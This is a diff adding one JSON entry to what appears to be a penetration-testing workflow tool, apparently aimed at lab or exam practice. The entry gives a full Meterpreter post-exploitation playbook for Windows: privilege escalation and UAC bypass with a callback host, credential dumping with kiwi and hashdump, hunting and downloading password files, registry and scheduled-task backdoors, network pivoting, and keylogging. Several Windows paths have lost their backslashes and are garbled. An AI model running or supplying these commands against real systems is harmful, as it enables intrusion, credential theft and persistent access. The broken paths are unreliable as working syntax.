@@ -1,0 +1,30 @@
+{
+  "id": "msf_post_windows",
+  "phase": "POST",
+  "title": "Meterpreter — Windows Post Exploitation",
+  "body": "Dedicated Meterpreter post-exploit workflow for Windows. Run these in order: situational awareness → privilege escalation → credential dumping → persistence → pivot.",
+  "cmd": "# ── STEP 1: SITUATIONAL AWARENESS ────────────────────\nsysinfo                            # OS, hostname, arch\ngetuid                             # current user\ngetpid                             # current process ID\nidletime                           # is user at keyboard?\nps                                 # list all processes\n\n# ── STEP 2: CHECK PRIVILEGES ──────────────────────────\nshell                              # drop to cmd\nwhoami /priv                       # check SeImpersonatePrivilege etc\nwhoami /groups                     # group membership\nnet user                           # local users\nnet localgroup administrators      # who's admin?\nexit                               # back to meterpreter\n\n# ── STEP 3: PRIVILEGE ESCALATION ──────────────────────\n# If SeImpersonatePrivilege enabled:\ngetsystem                          # auto privesc → SYSTEM\ngetuid                             # confirm SYSTEM\n\n# If getsystem fails — UAC bypass:\nbg                                 # background session\nuse exploit/windows/local/bypassuac_sdclt\nset SESSION <id>\nset LHOST 192.168.45.210\nrun                                # spawns high-integrity session\n\n# ── STEP 4: PROCESS MIGRATION ─────────────────────────\n# Move out of suspicious process into legit one\nps                                 # find good target (explorer, OneDrive, svchost)\nmigrate <PID>                      # migrate to that PID\nexecute -H -f notepad              # spawn hidden process if none suitable\nmigrate <new_PID>\n\n# ── STEP 5: CREDENTIAL DUMPING ────────────────────────\n# Requires SYSTEM\nload kiwi\ncreds_all                          # dump everything\ncreds_msv                          # NTLM hashes\ncreds_wdigest                      # plaintext (older systems)\nlsa_dump_sam                       # SAM database\nlsa_dump_secrets                   # LSA secrets\nhashdump                           # quick SAM dump (no kiwi needed)\n\n# ── STEP 6: SITUATIONAL AWARENESS (NETWORK) ───────────\nshell\nipconfig /all                      # find other interfaces/subnets\nroute print                        # routing table\narp -a                             # ARP cache — other live hosts\nnetstat -ano                       # active connections\nexit\n\n# ── STEP 7: FILE SYSTEM HUNTING ───────────────────────\nsearch -f *.txt -d C:Users       # find text files\nsearch -f *password* -d C:       # find password files\nsearch -f *pass* -d C:           # broader search\nsearch -f *.kdbx -d C:          # KeePass databases\nsearch -f SAM -d C:WindowsSystem32config\ndownload C:\\\\xampppasswords.txt  # download specific file\ndownload C:UsersAdministratorDesktop\flag.txt\nlcd /home/kali/loot                # set local download dir\ndownload C:Users -r              # recursive download\n\n# ── STEP 8: PERSISTENCE ───────────────────────────────\n# Registry run key:\nshell\nreg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionRun\" /v backdoor /t REG_SZ /d \"C:UsersPublicmet.exe\"\n\n# Scheduled task:\nschtasks /create /tn \"updater\" /tr \"C:UsersPublicmet.exe\" /sc onlogon /ru SYSTEM\n\n# ── STEP 9: PIVOT TO INTERNAL NETWORK ─────────────────\nbg                                 # background session\nuse multi/manage/autoroute\nset SESSION <id>\nrun                                # auto-add internal routes\nroute print                        # confirm routes added\n\nuse auxiliary/server/socks_proxy\nset SRVHOST 127.0.0.1\nset VERSION 5\nrun -j\n# Update /etc/proxychains4.conf: socks5 127.0.0.1 1080\n\n# Port forward specific service:\nsessions -i <id>\nportfwd add -l 3389 -p 3389 -r 172.16.5.200\n# Then: xfreerdp /v:127.0.0.1 /u:luiza\n\n# ── USEFUL EXTRAS ─────────────────────────────────────\nscreenshare                        # live desktop view\nkeyscan_start                      # start keylogger\nkeyscan_dump                       # dump keystrokes\nkeyscan_stop\nrun post/windows/gather/enum_logged_on_users\nrun post/windows/gather/enum_applications\nrun post/multi/recon/local_exploit_suggester  # suggest local exploits",
+  "warn": "Always migrate out of your initial process — if the user closes the app your session dies. Kiwi requires SYSTEM. getsystem uses SeImpersonatePrivilege (PrintSpooler variant) — check whoami /priv first.",
+  "choices": [
+    {
+      "label": "SeImpersonatePrivilege — Potato attacks",
+      "next": "token_privs"
+    },
+    {
+      "label": "Need UAC bypass",
+      "next": "win_uac_bypass"
+    },
+    {
+      "label": "Pivot to internal network",
+      "next": "pivot_start"
+    },
+    {
+      "label": "Full Windows post exploit (manual)",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Back to MSF",
+      "next": "msfconsole"
+    }
+  ]
+}
